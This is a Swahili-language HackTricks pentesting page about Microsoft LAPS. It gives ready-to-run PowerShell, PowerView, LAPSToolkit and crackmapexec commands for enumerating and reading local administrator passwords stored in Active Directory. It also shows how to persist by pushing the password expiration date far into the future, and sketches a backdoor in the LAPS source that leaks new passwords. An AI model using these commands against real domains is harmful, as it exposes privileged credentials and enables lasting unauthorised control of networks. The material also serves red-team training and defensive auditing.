# LAPS

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Unataka kuona **kampuni yako ikitangazwa kwenye HackTricks**? au unataka kupata upatikanaji wa **toleo jipya la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* Pata [**swagi rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha** [**telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## Taarifa Msingi

LAPS (Local Administrator Password Solution) ni zana inayotumika kusimamia mfumo ambapo **manenosiri ya msimamizi**, ambayo ni **ya kipekee, yaliyochanganywa, na yanabadilishwa mara kwa mara**, hutumiwa kwa kompyuta zilizojiunga na uwanja. Manenosiri haya hifadhiwa kwa usalama ndani ya Active Directory na yanapatikana tu kwa watumiaji ambao wamepewa idhini kupitia Orodha za Kudhibiti Upatikanaji (ACLs). Usalama wa maambukizi ya nenosiri kutoka kwa mteja kwenda kwa seva unahakikishwa kwa kutumia **Kerberos toleo la 5** na **Advanced Encryption Standard (AES)**.

Katika vitu vya kompyuta vya uwanja, utekelezaji wa LAPS husababisha kuongezwa kwa sifa mbili mpya: **`ms-mcs-AdmPwd`** na **`ms-mcs-AdmPwdExpirationTime`**. Sifa hizi hifadhi **nenosiri la msimamizi katika maandishi wazi** na **muda wake wa kumalizika**, mtawalia.

### Angalia ikiwa imewashwa
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### Upatikanaji wa Nywila za LAPS

Unaweza **kupakua sera ya LAPS ya asili** kutoka `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` na kisha kutumia **`Parse-PolFile`** kutoka kwenye [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) pakiti inaweza kutumika kubadilisha faili hii kuwa muundo unaoeleweka na binadamu.

Zaidi ya hayo, **cmdlets za LAPS za asili za PowerShell** zinaweza kutumika ikiwa zimefungwa kwenye mashine tunayoweza kupata:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** inaweza kutumika pia kujua **nani anaweza kusoma nenosiri na kulisoma**:
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### Zana za LAPSToolkit

[Zana za LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) inarahisisha uorodheshaji wa LAPS hii kwa kutumia kazi kadhaa. Moja ni kuchambua **`ExtendedRights`** kwa **kompyuta zote zilizo na LAPS imewezeshwa.** Hii itaonyesha **makundi** maalum **yaliyoruhusiwa kusoma nywila za LAPS**, ambazo mara nyingi ni watumiaji katika makundi yaliyolindwa.\
**Akaunti** ambayo imejiunga na kompyuta kwenye kikoa hupokea `Haki Zote za Kipekee` juu ya mwenyeji huyo, na haki hii inampa **akaunti** uwezo wa **kusoma nywila**. Uorodheshaji unaweza kuonyesha akaunti ya mtumiaji ambayo inaweza kusoma nywila ya LAPS kwenye mwenyeji. Hii inaweza kutusaidia **kulenga watumiaji maalum wa AD** ambao wanaweza kusoma nywila za LAPS.
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Kudondoa Nywila za LAPS Kwa Kutumia Crackmapexec**
Ikiwa hakuna ufikiaji wa powershell unaweza kutumia mamlaka haya vibaya kijuujuu kupitia LDAP kwa kutumia
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
## **Utulivu wa LAPS**

### **Tarehe ya Muda**

Maradhi ya admin, ni **wezekano wa kupata nywila** na **kuzuia** mashine kutoka **kuboresha** nywila yake kwa **kuweka tarehe ya kumalizika muda kuwa ya baadaye**.
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
{% hint style="warning" %}
Nenosiri bado yataweza kurejeshwa ikiwa **msimamizi** anatumia **`Reset-AdmPwdPassword`** cmdlet; au ikiwa **Usiruhusu muda wa kumalizika kwa nenosiri kuwa mrefu kuliko ulivyowekwa na sera** imeanzishwa katika LAPS GPO.
{% endhint %}

### Mlango wa Nyuma

Msimbo wa chanzo halisi wa LAPS unaweza kupatikana [hapa](https://github.com/GreyCorbel/admpwd), hivyo niwezekanavyo kuweka mlango wa nyuma katika msimbo (ndani ya mbinu ya `Get-AdmPwdPassword` katika `Main/AdmPwd.PS/Main.cs` kwa mfano) ambao kwa namna fulani **utaondoa nywila mpya au kuzihifadhi mahali fulani**.

Kisha, tuunde upya `AdmPwd.PS.dll` na kuipakia kwenye mashine katika `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (na ubadilishe wakati wa marekebisho).

## Marejeo
* [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikitangazwa kwenye HackTricks**? au ungependa kupata upatikanaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) **kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha telegram**](https://t.me/peass) au **nifuatilie** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye [repo ya hacktricks](https://github.com/carlospolop/hacktricks) na [repo ya hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
